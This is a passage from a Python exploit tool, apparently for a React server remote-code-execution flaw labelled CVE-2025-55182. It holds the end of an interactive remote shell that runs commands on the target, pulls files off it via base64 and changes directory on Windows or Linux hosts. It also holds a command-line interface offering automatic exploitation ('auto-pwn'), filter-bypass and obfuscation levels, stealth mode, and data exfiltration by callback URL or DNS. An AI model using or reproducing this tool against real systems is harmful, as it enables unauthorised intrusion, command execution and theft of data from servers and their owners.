                            o=self.execute(f"base64 -w0 {rp}")
                        if o and '[-]' not in o and '[!' not in o:
                            try:
                                clean=o.strip().replace('\r','').replace('\n','').replace(' ','')
                                d=base64.b64decode(clean);open(lp,'wb').write(d);print(f"{G}Saved: {lp} ({len(d)}B){W}")
                            except Exception as e:print(f"{R}Decode error: {e}{W}")
                        else:print(f"{R}Failed to read file{W}")
                    elif cmd.startswith('cd '):
                        path=cmd.split(' ',1)[1]
                        if self.target_os=='windows':
                            o=self.execute(f'cd /d "{path}" && cd')
                            if o and '[-]' not in o:
                                lines=[x for x in o.strip().split('\n') if x.strip() and 'cannot find' not in x.lower()]
                                if lines:self.current_dir=lines[-1].strip()
                        else:
                            o=self.execute(f"cd {path} && pwd")
                            if o and o.strip().startswith('/') and '[-]' not in o:self.current_dir=o.strip().split('\n')[0]
                        if o and '[-]' not in o:print(f"{G}CWD: {self.current_dir}{W}")
                        elif o:print(o)
                    else:
                        out=self.execute(cmd);self.last_output=out or ""
                        if out:print(out)
                except KeyboardInterrupt:print(f"\n{Y}Use .exit to quit{W}")
                except EOFError:break
                except Exception as e:print(f"{R}Error: {e}{W}")
        finally:
            try:readline.write_history_file(self.hist)
            except:pass
            print(f"\n{G}Session ended.{W}")


# ═══════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════
def main():
    import argparse
    p=argparse.ArgumentParser(description="React2Shell Advanced v2 — CVE-2025-55182",
        formatter_class=argparse.RawDescriptionHelpFormatter,epilog="""
Examples:
  %(prog)s -u URL --safeprobe                     # Check if vulnerable (no RCE)
  %(prog)s -u URL --auto-pwn                      # Full auto-escalation
  %(prog)s -u URL --strategy B                    # lachlan2k original payload
  %(prog)s -u URL -j 2 -o 3 --bypass light        # Evasion mode
  %(prog)s -u URL --exfil callback --callback-url http://IP:PORT
  %(prog)s -u URL -c "id" --debug                  # Single command + debug

Strategies: A (circulating 3-part), B (lachlan2k original 5-part)
Bypass: none, light, medium, generic, heavy, aggressive
Exfil: redirect, redirect_plain, error, callback, dns
""")
    p.add_argument("-u","--url",required=True)
    p.add_argument("-c","--command")
    p.add_argument("-H","--host",help="Custom Host header (use domain when connecting via IP)")
    p.add_argument("--strategy",default="A",choices=['A','B'])
    p.add_argument("--bypass",default="none")
    p.add_argument("--exfil",default="redirect")
    p.add_argument("-o","--obfuscate",type=int,default=0)
    p.add_argument("-j","--json-escape",type=int,default=0)
    p.add_argument("--stealth",action="store_true")
    p.add_argument("--callback-url")
    p.add_argument("--dns-domain")
    p.add_argument("--proxy")
    p.add_argument("--timeout",type=int,default=90)
    p.add_argument("--debug",action="store_true")
    p.add_argument("--auto-pwn",action="store_true")
    p.add_argument("--safeprobe",action="store_true",help="Non-RCE vulnerability check only")
    args=p.parse_args()
    global DEBUG;DEBUG=args.debug
    shell=AdvancedShell(args.url,args)
    if args.safeprobe:
        shell.safe_probe();return
    if args.auto_pwn:
        print(f"{C}{'═'*50}{W}\n  {G}AUTO-PWN MODE{W}\n{C}{'═'*50}{W}")
        print(f"\n{Y}[1/3] Safe probe{W}");shell.safe_probe()
        print(f"\n{Y}[2/3] Raw test (strategy A + B){W}")
        shell.strategy='A';shell.raw_test("id")
        shell.strategy='B';shell.raw_test("id")
        print(f"\n{Y}[3/3] Auto-escalation{W}")
        out=shell.auto_exploit("id")
        if out:print(f"\n{G}OUTPUT:{W}\n{out}")
        print(f"\n{Y}Entering interactive shell...{W}")
        shell.run()
    elif args.command:
        out=shell.execute(args.command)
        if out:print(out)
    else:
        shell.run()

if __name__=="__main__":main()
